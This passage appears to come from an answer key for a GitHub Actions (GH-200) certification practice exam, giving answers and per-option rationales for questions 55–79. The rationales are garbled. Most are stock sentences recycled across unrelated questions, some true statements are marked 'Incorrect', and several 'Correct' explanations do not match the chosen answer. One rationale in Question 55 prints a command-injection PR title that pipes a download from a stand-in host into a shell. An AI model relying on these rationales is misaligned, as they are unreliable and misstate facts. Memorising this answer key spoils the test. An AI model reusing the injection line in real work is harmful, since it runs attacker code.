- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **F:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 55 — `B` (Author and maintain actions)

Correct answer: B (is correct). `core.notice(message, properties)` (`emitting ::notice title=...::...`) surfaces a non-failing informational annotation on the workflow run Summary page and PR Checks tab. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.

### Question 56 — `B` (Author and maintain actions)

Correct answer: B (is correct). GitHub Actions automatically mounts and passes environment file paths (`$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_STEP_SUMMARY`, `$GITHUB_PATH`, `$GITHUB_STATE`) into Docker action containers, so `echo "signature_alg=ES256" >> "$GITHUB_OUTPUT"` exports outputs cleanly. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 57 — `C` (Author and maintain actions)

Correct answer: C (is correct). Keep `solsticecloud-drm/watermark-action` `Private` and set `Settings -> Actions -> General -> Access -> Accessible from repositories in the 'solsticecloud-drm' organization` (`rather than enterprise-wide access`, paired with org/Ruleset governance). [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 58 — `D` (Author and maintain actions)

Correct answer: D (is correct). Reference a prebuilt, digest-pinned container image (`runs.image: 'docker://ghcr.io/solsticecloud/watermark-action@sha256:...'`) so runners pull verified cached layers directly instead of executing `docker build` during every workflow job. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.

### Question 59 — `A` (Author and maintain actions)

Correct answer: A (is correct). Creating a `Public` single-action repo with root `action.yml`, adding unique `name`/`description`/`README`/`branding`, enabling `2FA` + accepting the Marketplace Developer Agreement, and publishing a `v1.0.0` Release (`Publish to Marketplace`) completes Marketplace listing. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Correct. GitHub Marketplace requires a public single-action repo with root `action.yml`, complete branding/docs, `2FA`, and a SemVer GitHub Release.
- **B:** Incorrect. Marketplace enforces globally unique action `name` metadata and root `action.yml` validation inside the Release UI.
- **C:** Incorrect. EMU accounts cannot publish public repos on `github.com`, and `description`/`runs` + SemVer version tags are mandatory.
- **D:** Incorrect. Private/Internal repos and multi-action monorepos cannot publish directly to GitHub Marketplace, and Releases + `2FA` are required.

### Question 60 — `A` (Author and maintain actions)

Correct answer: A (is correct). An organization applies for publisher verification with GitHub (`verifying organization domain ownership via DNS TXT record, 2FA enforcement, and GitHub's partner/creator verification review`) on its public GitHub organization profile. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Correct. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 61 — `A` (Author and maintain actions)

Correct answer: A (is correct). Move floating tags `v2` and `v2.4` (`git tag -fa v2 && git tag -fa v2.4 && git push origin v2 v2.4 --force`) to the `v2.4.1` commit, leaving `v1` untouched at `v1.9.3`. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 62 — `C, E` (Author and maintain actions)

Correct answers: C and E (are correct). Unreviewed commits (`or force-pushes / compromised maintainer pushes`) on `main` execute immediately inside consumer CI with access to job secrets/OIDC, AND breaking changes merged to `main` break downstream builds unpredictably without Dependabot PR gates. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Correct. Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.
- **F:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 63 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Required workflows enforced via Repository Rulesets (`Require workflows to pass before merging`) must declare `on: pull_request` (`and merge_group if Merge Queues are enabled`) so GitHub triggers and evaluates them on PR merge checks. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.

### Question 64 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Inspect Organization Audit Logs (`action: workflows.*` / Insights -> Actions usage metrics -> Performance & usage by workflow/repository) or code-search `uses: solsticecloud/ci-shared` across the Enterprise before sunsetting `v1`. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 65 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Create a second Ruleset in **Evaluate mode** (`Enterprise`), or pin the production Ruleset to immutable tag `refs/tags/v1.4.0` while testing `v1.5.0-rc1` on pilot repositories (`filtered by custom repository property release_ring = canary`) before updating the production Ruleset ref. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 66 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Setting `Settings -> Actions -> General -> Access -> Accessible from repositories in the 'solsticecloud' enterprise` allows `Private` and `Internal` repositories across all member organizations (`including aurora-vfx`) to invoke `media-actions`. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 67 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Add explicit least-privilege `permissions:` blocks (`such as permissions: { contents: write }` or `{ pull-requests: write }`) inside only the specific `.github/workflows/*.yml` jobs that require write scopes. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.

### Question 68 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). No — GitHub strictly prohibits `Public` repositories from calling reusable workflows or custom actions stored in `Private` or `Internal` repositories (`preventing fork PRs or public run logs from probing internal CI assets`). [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 69 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Yes — when `Require actions to be pinned to a full-length commit SHA` is enabled, ALL external actions (`even those matching allowlist namespace patterns or Verified creators`) must be referenced by a full 40-character commit SHA (`not @v4`). [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 70 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Under `first-time contributors`, once a user lands a single trivial typo-fix PR in the repository, future fork PRs from that account run CI automatically without pre-approval; `Require approval for all outside collaborators` gates EVERY fork PR from non-org-members regardless of prior merged PRs. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.

### Question 71 — `C, E, F` (Manage GitHub Actions for the enterprise)

Correct answers: C, E, and F (are correct). Enforce Enterprise `Require actions to be pinned to a full-length commit SHA` (`with Immutable Actions`), replace static AWS/GCP/Azure secrets with scoped OIDC federation (`id-token: write` + strict `sub`/`aud`), and sign/verify SLSA provenance via `actions/attest-build-provenance` + `gh attestation verify`. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **E:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **F:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.

### Question 72 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Exactly `1` job — once that single assigned job completes (`succeeds, fails, or cancels`), the runner process exits and GitHub automatically deletes its registration so the orchestrator can destroy the ephemeral VM cleanly. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.

### Question 73 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Running `gha-runner-scale-set` in default **runner-only** pod mode (`omitting dind and kubernetes containerMode`) launches unprivileged single-container ephemeral pods in ~1–2 seconds with minimal attack surface (`pairing crane/buildah/kaniko for OCI image pushes`). [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 74 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). The Kubernetes Secret stores `github_app_id`, `github_app_installation_id`, and `github_app_private_key` (`for an org GitHub App granted Organization -> Self-hosted runners: Read and write`), avoiding personal PAT expiry and user rate-limit bottlenecks. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 75 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Yes — Azure Private Networking (`GitHub.Network/networkSettings`) injects Linux (`and Windows`) Larger runners directly into your private Azure VNet, and routing egress via an Azure NAT Gateway gives deterministic public IPs for your Enterprise IP allow list. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **C:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 76 — `C, F` (Manage GitHub Actions for the enterprise)

Correct answers: C and F (are correct). Disable TLS man-in-the-middle SSL decryption (`or install the enterprise root CA in both OS trust + NODE_EXTRA_CA_CERTS`) and allow outbound HTTPS `443` to `*.actions.githubusercontent.com` (`including results-receiver / blob storage`), `ghcr.io`, `github.com`, and `api.github.com`. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **E:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **F:** Correct. Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 77 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Enabling `Public IP` (`static IP range`) on a GitHub-hosted Larger runner allocates dedicated CIDR ranges (`typically 2 /28 or /29 ranges = ~10–32 static IPs per runner pool, drawn from Enterprise Larger runner IP quota`) visible directly in the runner's Networking settings for firewall allowlisting. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 78 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Enabling `Restrict workflows that can run on this runner group` (`specifying solsticecloud/sec-ci/.github/workflows/drm-sign.yml@refs/tags/v4.0.0`) blocks any workflow file or ref other than the explicitly approved workflow ref from scheduling onto `drm-hsm-runners`. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 79 — `A, E` (Manage GitHub Actions for the enterprise)

Correct answers: A and E (are correct). Check `_diag/Runner_*.log` for long-poll/heartbeat timeouts (`HTTP 408/502/socket reset`) and `_diag/Worker_*.log` for step timing, while monitoring host IOPS, `/_work` free disk space, and concurrent NIC throughput (`sizing 1 runner agent per VM/pod`). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Correct. Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
